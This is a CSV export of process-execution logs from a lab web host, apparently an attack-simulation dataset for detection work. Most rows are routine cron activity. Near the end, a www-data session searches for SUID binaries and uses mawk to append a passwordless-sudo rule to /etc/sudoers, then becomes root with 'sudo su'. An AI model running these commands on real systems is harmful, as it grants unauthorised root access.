@timestamp,agent.hostname,command,cwd,event.ingested,filename,host.hostname,host.id,host.ip,host.mac,host.name,host.os.codename,host.os.family,host.os.kernel,host.os.name,host.os.type,host.os.version,message,sid,tty,uid
"Oct 24, 2022 @ 23:23:02.573",dvwa_web,env -i LANG= LANGUAGE= LC_CTYPE= LC_NUMERIC= LC_TIME= LC_COLLATE= LC_MONETARY= LC_MESSAGES= LC_PAPER= LC_NAME= LC_ADDRESS= LC_TELEPHONE= LC_MEASUREMENT= LC_IDENTIFICATION= LC_ALL= PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin TERM=xterm /etc/init.d/cron start,/,"Oct 24, 2022 @ 23:23:03.420",/usr/local/bin/env,dvwa_web,bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b",dvwa_web,bullseye,debian,5.15.0-52-generic,Debian GNU/Linux,linux,11 (bullseye),[uid:0 sid:256075 tty:/dev/pts/0 cwd:/ filename:/usr/local/bin/env]: env -i LANG= LANGUAGE= LC_CTYPE= LC_NUMERIC= LC_TIME= LC_COLLATE= LC_MONETARY= LC_MESSAGES= LC_PAPER= LC_NAME= LC_ADDRESS= LC_TELEPHONE= LC_MEASUREMENT= LC_IDENTIFICATION= LC_ALL= PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin TERM=xterm /etc/init.d/cron start,256075,/dev/pts/0,0
"Oct 24, 2022 @ 23:23:02.573",dvwa_web,env -i LANG= LANGUAGE= LC_CTYPE= LC_NUMERIC= LC_TIME= LC_COLLATE= LC_MONETARY= LC_MESSAGES= LC_PAPER= LC_NAME= LC_ADDRESS= LC_TELEPHONE= LC_MEASUREMENT= LC_IDENTIFICATION= LC_ALL= PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin TERM=xterm /etc/init.d/cron start,/,"Oct 24, 2022 @ 23:23:03.420",/usr/sbin/env,dvwa_web,bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b",dvwa_web,bullseye,debian,5.15.0-52-generic,Debian GNU/Linux,linux,11 (bullseye),[uid:0 sid:256075 tty:/dev/pts/0 cwd:/ filename:/usr/sbin/env]: env -i LANG= LANGUAGE= LC_CTYPE= LC_NUMERIC= LC_TIME= LC_COLLATE= LC_MONETARY= LC_MESSAGES= LC_PAPER= LC_NAME= LC_ADDRESS= LC_TELEPHONE= LC_MEASUREMENT= LC_IDENTIFICATION= LC_ALL= PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin TERM=xterm /etc/init.d/cron start,256075,/dev/pts/0,0
"Oct 24, 2022 @ 23:23:02.573",dvwa_web,env -i LANG= LANGUAGE= LC_CTYPE= LC_NUMERIC= LC_TIME= LC_COLLATE= LC_MONETARY= LC_MESSAGES= LC_PAPER= LC_NAME= LC_ADDRESS= LC_TELEPHONE= LC_MEASUREMENT= LC_IDENTIFICATION= LC_ALL= PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin TERM=xterm /etc/init.d/cron start,/,"Oct 24, 2022 @ 23:23:03.420",/usr/bin/env,dvwa_web,bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b",dvwa_web,bullseye,debian,5.15.0-52-generic,Debian GNU/Linux,linux,11 (bullseye),[uid:0 sid:256075 tty:/dev/pts/0 cwd:/ filename:/usr/bin/env]: env -i LANG= LANGUAGE= LC_CTYPE= LC_NUMERIC= LC_TIME= LC_COLLATE= LC_MONETARY= LC_MESSAGES= LC_PAPER= LC_NAME= LC_ADDRESS= LC_TELEPHONE= LC_MEASUREMENT= LC_IDENTIFICATION= LC_ALL= PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin TERM=xterm /etc/init.d/cron start,256075,/dev/pts/0,0
"Oct 24, 2022 @ 23:23:02.573",dvwa_web,run-parts --lsbsysinit --list /lib/lsb/init-functions.d,/,"Oct 24, 2022 @ 23:23:03.420",/bin/run-parts,dvwa_web,bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b",dvwa_web,bullseye,debian,5.15.0-52-generic,Debian GNU/Linux,linux,11 (bullseye),[uid:0 sid:256075 tty:/dev/pts/0 cwd:/ filename:/bin/run-parts]: run-parts --lsbsysinit --list /lib/lsb/init-functions.d,256075,/dev/pts/0,0
"Oct 24, 2022 @ 23:23:02.573",dvwa_web,cat /etc/timezone,/,"Oct 24, 2022 @ 23:23:03.420",/bin/cat,dvwa_web,bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b",dvwa_web,bullseye,debian,5.15.0-52-generic,Debian GNU/Linux,linux,11 (bullseye),[uid:0 sid:256075 tty:/dev/pts/0 cwd:/ filename:/bin/cat]: cat /etc/timezone,256075,/dev/pts/0,0
"Oct 24, 2022 @ 23:23:02.573",dvwa_web,/sbin/start-stop-daemon --start --nicelevel 0 --quiet --oknodo --chdir / --exec /usr/sbin/cron --oknodo --pidfile /var/run/crond.pid --,/,"Oct 24, 2022 @ 23:23:03.420",/sbin/start-stop-daemon,dvwa_web,bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b",dvwa_web,bullseye,debian,5.15.0-52-generic,Debian GNU/Linux,linux,11 (bullseye),[uid:0 sid:256075 tty:/dev/pts/0 cwd:/ filename:/sbin/start-stop-daemon]: /sbin/start-stop-daemon --start --nicelevel 0 --quiet --oknodo --chdir / --exec /usr/sbin/cron --oknodo --pidfile /var/run/crond.pid --,256075,/dev/pts/0,0
"Oct 24, 2022 @ 23:23:02.573",dvwa_web,/usr/sbin/cron,/,"Oct 24, 2022 @ 23:23:03.420",/usr/sbin/cron,dvwa_web,bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b",dvwa_web,bullseye,debian,5.15.0-52-generic,Debian GNU/Linux,linux,11 (bullseye),[uid:0 sid:256075 tty:/dev/pts/0 cwd:/ filename:/usr/sbin/cron]: /usr/sbin/cron,256075,/dev/pts/0,0
"Oct 24, 2022 @ 23:23:02.573",dvwa_web,/usr/bin/tput hpa 60,/,"Oct 24, 2022 @ 23:23:03.420",/usr/bin/tput,dvwa_web,bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b",dvwa_web,bullseye,debian,5.15.0-52-generic,Debian GNU/Linux,linux,11 (bullseye),[uid:0 sid:256075 tty:/dev/pts/0 cwd:/ filename:/usr/bin/tput]: /usr/bin/tput hpa 60,256075,/dev/pts/0,0
"Oct 24, 2022 @ 23:23:02.573",dvwa_web,/usr/bin/tput setaf 1,/,"Oct 24, 2022 @ 23:23:03.421",/usr/bin/tput,dvwa_web,bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b",dvwa_web,bullseye,debian,5.15.0-52-generic,Debian GNU/Linux,linux,11 (bullseye),[uid:0 sid:256075 tty:/dev/pts/0 cwd:/ filename:/usr/bin/tput]: /usr/bin/tput setaf 1,256075,/dev/pts/0,0
"Oct 24, 2022 @ 23:23:02.573",dvwa_web,/usr/bin/tput setaf 1,/,"Oct 24, 2022 @ 23:23:03.421",/usr/bin/tput,dvwa_web,bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b",dvwa_web,bullseye,debian,5.15.0-52-generic,Debian GNU/Linux,linux,11 (bullseye),[uid:0 sid:256075 tty:/dev/pts/0 cwd:/ filename:/usr/bin/tput]: /usr/bin/tput setaf 1,256075,/dev/pts/0,0
"Oct 24, 2022 @ 23:23:02.573",dvwa_web,/usr/bin/tput setaf 3,/,"Oct 24, 2022 @ 23:23:03.421",/usr/bin/tput,dvwa_web,bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b",dvwa_web,bullseye,debian,5.15.0-52-generic,Debian GNU/Linux,linux,11 (bullseye),[uid:0 sid:256075 tty:/dev/pts/0 cwd:/ filename:/usr/bin/tput]: /usr/bin/tput setaf 3,256075,/dev/pts/0,0
"Oct 24, 2022 @ 23:23:02.573",dvwa_web,/usr/bin/tput op,/,"Oct 24, 2022 @ 23:23:03.421",/usr/bin/tput,dvwa_web,bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b",dvwa_web,bullseye,debian,5.15.0-52-generic,Debian GNU/Linux,linux,11 (bullseye),[uid:0 sid:256075 tty:/dev/pts/0 cwd:/ filename:/usr/bin/tput]: /usr/bin/tput op,256075,/dev/pts/0,0
"Oct 24, 2022 @ 23:23:00.572",dvwa_web,service cron status,/exploits/Privilege_Escalation_T1548.001,"Oct 24, 2022 @ 23:23:01.575",/usr/sbin/service,dvwa_web,bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b",dvwa_web,bullseye,debian,5.15.0-52-generic,Debian GNU/Linux,linux,11 (bullseye),[uid:0 sid:256075 tty:/dev/pts/0 cwd:/exploits/Privilege_Escalation_T1548.001 filename:/usr/sbin/service]: service cron status,256075,/dev/pts/0,0
"Oct 24, 2022 @ 23:23:00.572",dvwa_web,basename /usr/sbin/service,/exploits/Privilege_Escalation_T1548.001,"Oct 24, 2022 @ 23:23:01.575",/usr/bin/basename,dvwa_web,bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b",dvwa_web,bullseye,debian,5.15.0-52-generic,Debian GNU/Linux,linux,11 (bullseye),[uid:0 sid:256075 tty:/dev/pts/0 cwd:/exploits/Privilege_Escalation_T1548.001 filename:/usr/bin/basename]: basename /usr/sbin/service,256075,/dev/pts/0,0
"Oct 24, 2022 @ 23:23:00.572",dvwa_web,basename /usr/sbin/service,/exploits/Privilege_Escalation_T1548.001,"Oct 24, 2022 @ 23:23:01.575",/usr/bin/basename,dvwa_web,bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b",dvwa_web,bullseye,debian,5.15.0-52-generic,Debian GNU/Linux,linux,11 (bullseye),[uid:0 sid:256075 tty:/dev/pts/0 cwd:/exploits/Privilege_Escalation_T1548.001 filename:/usr/bin/basename]: basename /usr/sbin/service,256075,/dev/pts/0,0
"Oct 24, 2022 @ 23:23:00.572",dvwa_web,env -i LANG= LANGUAGE= LC_CTYPE= LC_NUMERIC= LC_TIME= LC_COLLATE= LC_MONETARY= LC_MESSAGES= LC_PAPER= LC_NAME= LC_ADDRESS= LC_TELEPHONE= LC_MEASUREMENT= LC_IDENTIFICATION= LC_ALL= PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin TERM=xterm /etc/init.d/cron status,/,"Oct 24, 2022 @ 23:23:01.575",/usr/local/sbin/env,dvwa_web,bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b",dvwa_web,bullseye,debian,5.15.0-52-generic,Debian GNU/Linux,linux,11 (bullseye),[uid:0 sid:256075 tty:/dev/pts/0 cwd:/ filename:/usr/local/sbin/env]: env -i LANG= LANGUAGE= LC_CTYPE= LC_NUMERIC= LC_TIME= LC_COLLATE= LC_MONETARY= LC_MESSAGES= LC_PAPER= LC_NAME= LC_ADDRESS= LC_TELEPHONE= LC_MEASUREMENT= LC_IDENTIFICATION= LC_ALL= PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin TERM=xterm /etc/init.d/cron status,256075,/dev/pts/0,0
"Oct 24, 2022 @ 23:23:00.572",dvwa_web,env -i LANG= LANGUAGE= LC_CTYPE= LC_NUMERIC= LC_TIME= LC_COLLATE= LC_MONETARY= LC_MESSAGES= LC_PAPER= LC_NAME= LC_ADDRESS= LC_TELEPHONE= LC_MEASUREMENT= LC_IDENTIFICATION= LC_ALL= PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin TERM=xterm /etc/init.d/cron status,/,"Oct 24, 2022 @ 23:23:01.575",/usr/local/bin/env,dvwa_web,bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b",dvwa_web,bullseye,debian,5.15.0-52-generic,Debian GNU/Linux,linux,11 (bullseye),[uid:0 sid:256075 tty:/dev/pts/0 cwd:/ filename:/usr/local/bin/env]: env -i LANG= LANGUAGE= LC_CTYPE= LC_NUMERIC= LC_TIME= LC_COLLATE= LC_MONETARY= LC_MESSAGES= LC_PAPER= LC_NAME= LC_ADDRESS= LC_TELEPHONE= LC_MEASUREMENT= LC_IDENTIFICATION= LC_ALL= PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin TERM=xterm /etc/init.d/cron status,256075,/dev/pts/0,0
"Oct 24, 2022 @ 23:23:00.572",dvwa_web,env -i LANG= LANGUAGE= LC_CTYPE= LC_NUMERIC= LC_TIME= LC_COLLATE= LC_MONETARY= LC_MESSAGES= LC_PAPER= LC_NAME= LC_ADDRESS= LC_TELEPHONE= LC_MEASUREMENT= LC_IDENTIFICATION= LC_ALL= PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin TERM=xterm /etc/init.d/cron status,/,"Oct 24, 2022 @ 23:23:01.575",/usr/sbin/env,dvwa_web,bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b",dvwa_web,bullseye,debian,5.15.0-52-generic,Debian GNU/Linux,linux,11 (bullseye),[uid:0 sid:256075 tty:/dev/pts/0 cwd:/ filename:/usr/sbin/env]: env -i LANG= LANGUAGE= LC_CTYPE= LC_NUMERIC= LC_TIME= LC_COLLATE= LC_MONETARY= LC_MESSAGES= LC_PAPER= LC_NAME= LC_ADDRESS= LC_TELEPHONE= LC_MEASUREMENT= LC_IDENTIFICATION= LC_ALL= PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin TERM=xterm /etc/init.d/cron status,256075,/dev/pts/0,0
"Oct 24, 2022 @ 23:23:00.572",dvwa_web,env -i LANG= LANGUAGE= LC_CTYPE= LC_NUMERIC= LC_TIME= LC_COLLATE= LC_MONETARY= LC_MESSAGES= LC_PAPER= LC_NAME= LC_ADDRESS= LC_TELEPHONE= LC_MEASUREMENT= LC_IDENTIFICATION= LC_ALL= PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin TERM=xterm /etc/init.d/cron status,/,"Oct 24, 2022 @ 23:23:01.575",/usr/bin/env,dvwa_web,bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b",dvwa_web,bullseye,debian,5.15.0-52-generic,Debian GNU/Linux,linux,11 (bullseye),[uid:0 sid:256075 tty:/dev/pts/0 cwd:/ filename:/usr/bin/env]: env -i LANG= LANGUAGE= LC_CTYPE= LC_NUMERIC= LC_TIME= LC_COLLATE= LC_MONETARY= LC_MESSAGES= LC_PAPER= LC_NAME= LC_ADDRESS= LC_TELEPHONE= LC_MEASUREMENT= LC_IDENTIFICATION= LC_ALL= PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin TERM=xterm /etc/init.d/cron status,256075,/dev/pts/0,0
"Oct 24, 2022 @ 23:23:00.572",dvwa_web,run-parts --lsbsysinit --list /lib/lsb/init-functions.d,/,"Oct 24, 2022 @ 23:23:01.575",/bin/run-parts,dvwa_web,bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b",dvwa_web,bullseye,debian,5.15.0-52-generic,Debian GNU/Linux,linux,11 (bullseye),[uid:0 sid:256075 tty:/dev/pts/0 cwd:/ filename:/bin/run-parts]: run-parts --lsbsysinit --list /lib/lsb/init-functions.d,256075,/dev/pts/0,0
"Oct 24, 2022 @ 23:23:00.572",dvwa_web,cat /etc/timezone,/,"Oct 24, 2022 @ 23:23:01.575",/bin/cat,dvwa_web,bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b",dvwa_web,bullseye,debian,5.15.0-52-generic,Debian GNU/Linux,linux,11 (bullseye),[uid:0 sid:256075 tty:/dev/pts/0 cwd:/ filename:/bin/cat]: cat /etc/timezone,256075,/dev/pts/0,0
"Oct 24, 2022 @ 23:23:00.572",dvwa_web,/usr/bin/tput hpa 60,/,"Oct 24, 2022 @ 23:23:01.575",/usr/bin/tput,dvwa_web,bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b",dvwa_web,bullseye,debian,5.15.0-52-generic,Debian GNU/Linux,linux,11 (bullseye),[uid:0 sid:256075 tty:/dev/pts/0 cwd:/ filename:/usr/bin/tput]: /usr/bin/tput hpa 60,256075,/dev/pts/0,0
"Oct 24, 2022 @ 23:23:00.572",dvwa_web,/usr/bin/tput setaf 1,/,"Oct 24, 2022 @ 23:23:01.575",/usr/bin/tput,dvwa_web,bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b",dvwa_web,bullseye,debian,5.15.0-52-generic,Debian GNU/Linux,linux,11 (bullseye),[uid:0 sid:256075 tty:/dev/pts/0 cwd:/ filename:/usr/bin/tput]: /usr/bin/tput setaf 1,256075,/dev/pts/0,0
"Oct 24, 2022 @ 23:23:00.572",dvwa_web,/usr/bin/tput setaf 1,/,"Oct 24, 2022 @ 23:23:01.575",/usr/bin/tput,dvwa_web,bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b",dvwa_web,bullseye,debian,5.15.0-52-generic,Debian GNU/Linux,linux,11 (bullseye),[uid:0 sid:256075 tty:/dev/pts/0 cwd:/ filename:/usr/bin/tput]: /usr/bin/tput setaf 1,256075,/dev/pts/0,0
"Oct 24, 2022 @ 23:23:00.572",dvwa_web,/usr/bin/tput setaf 3,/,"Oct 24, 2022 @ 23:23:01.575",/usr/bin/tput,dvwa_web,bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b",dvwa_web,bullseye,debian,5.15.0-52-generic,Debian GNU/Linux,linux,11 (bullseye),[uid:0 sid:256075 tty:/dev/pts/0 cwd:/ filename:/usr/bin/tput]: /usr/bin/tput setaf 3,256075,/dev/pts/0,0
"Oct 24, 2022 @ 23:23:00.572",dvwa_web,/usr/bin/tput op,/,"Oct 24, 2022 @ 23:23:01.576",/usr/bin/tput,dvwa_web,bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b",dvwa_web,bullseye,debian,5.15.0-52-generic,Debian GNU/Linux,linux,11 (bullseye),[uid:0 sid:256075 tty:/dev/pts/0 cwd:/ filename:/usr/bin/tput]: /usr/bin/tput op,256075,/dev/pts/0,0
"Oct 24, 2022 @ 23:23:00.572",dvwa_web,/bin/echo -e  [31mfailed![39;49m,/,"Oct 24, 2022 @ 23:23:01.576",/bin/echo,dvwa_web,bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b",dvwa_web,bullseye,debian,5.15.0-52-generic,Debian GNU/Linux,linux,11 (bullseye),[uid:0 sid:256075 tty:/dev/pts/0 cwd:/ filename:/bin/echo]: /bin/echo -e  [31mfailed![39;49m,256075,/dev/pts/0,0
"Oct 24, 2022 @ 23:22:36.568",dvwa_web,./exploit_suid_binary.sh,/exploits/Privilege_Escalation_T1548.001,"Oct 24, 2022 @ 23:22:37.416",./exploit_suid_binary.sh,dvwa_web,bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b",dvwa_web,bullseye,debian,5.15.0-52-generic,Debian GNU/Linux,linux,11 (bullseye),[uid:33 sid:256075 tty:/dev/pts/0 cwd:/exploits/Privilege_Escalation_T1548.001 filename:./exploit_suid_binary.sh]: ./exploit_suid_binary.sh,256075,/dev/pts/0,33
"Oct 24, 2022 @ 23:22:36.568",dvwa_web,find / -perm -u=s -type f,/exploits/Privilege_Escalation_T1548.001,"Oct 24, 2022 @ 23:22:37.416",/usr/bin/find,dvwa_web,bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b",dvwa_web,bullseye,debian,5.15.0-52-generic,Debian GNU/Linux,linux,11 (bullseye),[uid:33 sid:256075 tty:/dev/pts/0 cwd:/exploits/Privilege_Escalation_T1548.001 filename:/usr/bin/find]: find / -perm -u=s -type f,256075,/dev/pts/0,33
"Oct 24, 2022 @ 23:22:36.568",dvwa_web,"mawk -v LFILE=/etc/sudoers BEGIN { print ""www-data ALL=(ALL) NOPASSWD:ALL"" >> LFILE }",/exploits/Privilege_Escalation_T1548.001,"Oct 24, 2022 @ 23:22:37.416",/usr/bin/mawk,dvwa_web,bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b",dvwa_web,bullseye,debian,5.15.0-52-generic,Debian GNU/Linux,linux,11 (bullseye),"[uid:33 sid:256075 tty:/dev/pts/0 cwd:/exploits/Privilege_Escalation_T1548.001 filename:/usr/bin/mawk]: mawk -v LFILE=/etc/sudoers BEGIN { print ""www-data ALL=(ALL) NOPASSWD:ALL"" >> LFILE }",256075,/dev/pts/0,33
"Oct 24, 2022 @ 23:22:36.568",dvwa_web,sudo su,/exploits/Privilege_Escalation_T1548.001,"Oct 24, 2022 @ 23:22:37.416",/usr/bin/sudo,dvwa_web,bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b",dvwa_web,bullseye,debian,5.15.0-52-generic,Debian GNU/Linux,linux,11 (bullseye),[uid:33 sid:256075 tty:/dev/pts/0 cwd:/exploits/Privilege_Escalation_T1548.001 filename:/usr/bin/sudo]: sudo su,256075,/dev/pts/0,33
"Oct 24, 2022 @ 23:22:36.568",dvwa_web,su,/exploits/Privilege_Escalation_T1548.001,"Oct 24, 2022 @ 23:22:37.416",/bin/su,dvwa_web,bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b",dvwa_web,bullseye,debian,5.15.0-52-generic,Debian GNU/Linux,linux,11 (bullseye),[uid:0 sid:256075 tty:/dev/pts/0 cwd:/exploits/Privilege_Escalation_T1548.001 filename:/bin/su]: su,256075,/dev/pts/0,0
"Oct 24, 2022 @ 23:22:36.568",dvwa_web,bash,/exploits/Privilege_Escalation_T1548.001,"Oct 24, 2022 @ 23:22:37.416",/bin/bash,dvwa_web,bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b",dvwa_web,bullseye,debian,5.15.0-52-generic,Debian GNU/Linux,linux,11 (bullseye),[uid:0 sid:256075 tty:/dev/pts/0 cwd:/exploits/Privilege_Escalation_T1548.001 filename:/bin/bash]: bash,256075,/dev/pts/0,0
